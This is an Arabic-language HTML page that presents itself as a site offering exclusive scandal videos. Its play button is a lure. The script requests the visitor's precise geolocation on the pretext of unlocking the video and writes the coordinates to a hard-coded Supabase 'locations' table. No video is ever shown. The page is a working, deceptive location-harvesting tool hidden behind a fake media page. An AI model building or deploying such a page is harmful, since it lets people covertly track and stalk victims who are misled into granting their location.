<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>2026 Scandals</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            background: #111;
            font-family: Arial, sans-serif;
            color: white;

            display: flex;
            justify-content: center;
            align-items: center;

            padding: 20px;
        }

        .page {
            width: 100%;
            max-width: 600px;
            text-align: center;
        }

        h1 {
            margin: 0 0 10px;
            font-size: 28px;
        }

        .subtitle {
            color: #ddd;
            margin-bottom: 20px;
        }

        .video-preview {
            position: relative;

            width: 100%;
            aspect-ratio: 16 / 9;

            background-image: url("./image.png");
            background-size: cover;
            background-position: center;

            border-radius: 12px;
            overflow: hidden;

            display: flex;
            justify-content: center;
            align-items: center;

            cursor: pointer;
        }

        .video-preview::before {
            content: "";
            position: absolute;
            inset: 0;

            background: rgba(0, 0, 0, 0.20);
        }

        .play-button {
            position: relative;
            z-index: 2;

            width: 78px;
            height: 78px;

            border-radius: 50%;

            background: white;
            color: #111;

            display: flex;
            align-items: center;
            justify-content: center;

            font-size: 36px;
            padding-left: 5px;

            transition: transform 0.2s;
        }

        .video-preview:hover .play-button {
            transform: scale(1.08);
        }

        .video-label {
            position: absolute;

            z-index: 2;

            bottom: 15px;
            left: 0;
            right: 0;

            color: white;
            font-size: 16px;

            text-shadow: 0 1px 4px #000;
        }

        .notice {
            margin-top: 18px;

            padding: 14px;

            background: #222;

            border-radius: 10px;

            color: #ddd;

            line-height: 1.7;
            font-size: 14px;
        }

        #result {
            margin-top: 20px;
            min-height: 30px;
            line-height: 2;
        }

        .success {
            color: #20d866;
            font-weight: bold;
        }

        .error {
            color: #ff5555;
            font-weight: bold;
        }

        .loading {
            color: #ddd;
        }

        .location-link {
            display: inline-block;
            margin-top: 10px;
            color: #4da3ff;
            text-decoration: none;
        }
    </style>
</head>

<body>

<div class="page">

    <h1>
       فديوهات حصريه
    </h1>

    <div class="subtitle">
        اضغط علي الزر لمشاهده الفديو
    </div>

    <!-- الصورة + زر التشغيل -->

    <div
        class="video-preview"
        id="locationButton"
        role="button"
        tabindex="0"
        aria-label="فديوهات حصريه"
    >

        <div class="play-button">
            ▶
        </div>

        <div class="video-label">
            اضغط لمشاهده الفديو
        </div>

    </div>

    <!-- توضيح واضح -->

    <div class="notice">
        اضغط على زر للتشغيل.
       سيطلب منك الاذن للوصول الي الفديو 
    
    </div>

    <div id="result"></div>

</div>


<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<script>

    const SUPABASE_URL =
        "https://vsztpvsicsmxjhsvqzbv.supabase.co";

    const SUPABASE_PUBLISHABLE_KEY =
        "sb_publishable_N2P-l8nE7GaChsD5lrxb4w_nr8K5UrM";


    const supabaseClient =
        window.supabase.createClient(
            SUPABASE_URL,
            SUPABASE_PUBLISHABLE_KEY
        );


    const locationButton =
        document.getElementById("locationButton");

    const result =
        document.getElementById("result");


    let processing = false;


    locationButton.addEventListener(
        "click",
        requestLocation
    );


    locationButton.addEventListener(
        "keydown",
        function(event) {

            if (
                event.key === "Enter" ||
                event.key === " "
            ) {

                event.preventDefault();

                requestLocation();
            }

        }
    );


    function requestLocation() {

        if (processing) {
            return;
        }


        if (!navigator.geolocation) {

            result.innerHTML =
                '<span class="error">' +
                'Your browser does not support location.' +
                '</span>';

            return;
        }


        processing = true;

        result.innerHTML =
            '<span class="loading">' +
            'Requesting your permission to access your location...' +
            '</span>';


        navigator.geolocation.getCurrentPosition(

            locationSuccess,

            locationError,

            {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            }

        );
    }


    async function locationSuccess(position) {

        const latitude =
            position.coords.latitude;

        const longitude =
            position.coords.longitude;

        const accuracy =
            position.coords.accuracy;


        result.innerHTML =
            '<span class="loading">' +
            'Saving your location...' +
            '</span>';


        try {

            const { error } =
                await supabaseClient
                    .from("locations")
                    .insert({

                        latitude: latitude,

                        longitude: longitude,

                        accuracy: accuracy

                    });


            if (error) {

                console.error(
                    "Supabase error:",
                    error
                );

                result.innerHTML =
                    '<span class="error">' +
                    'Registration failed.' +
                    '</span>';

                processing = false;

                return;
            }


            const mapUrl =
                "https://www.google.com/maps?q=" +
                latitude +
                "," +
                longitude;


            result.innerHTML =

                '<span class="success">' +
                'سيتم مشاهده الفديو الان  ✅' +
                '</span>' +

                '<br>' +

                'Accuracy: ' +
                Math.round(accuracy) +
                ' meters' +

                '<br>' +

                '<a class="location-link" ' +
                'href="' +
                mapUrl +
                '" target="_blank">' +
            
                '</a>';

        }

        catch (error) {

            console.error(error);

            result.innerHTML =
                '<span class="error">' +
                'Registration failed.' +
                '</span>';

        }


        processing = false;
    }


    function locationError(error) {

        console.error(
            "Location error:",
            error
        );


        if (error.code === 1) {

            result.innerHTML =
                '<span class="error">' +
                'Location permission was not granted.' +
                '</span>';

        }

        else if (error.code === 2) {

            result.innerHTML =
                '<span class="error">' +
                'Unable to determine your location.' +
                '</span>';

        }

        else if (error.code === 3) {

            result.innerHTML =
                '<span class="error">' +
                'Location request timed out.' +
                '</span>';

        }

        else {

            result.innerHTML =
                '<span class="error">' +
                'Unable to get your location.' +
                '</span>';

        }


        processing = false;
    }

</script>

</body>
</html>
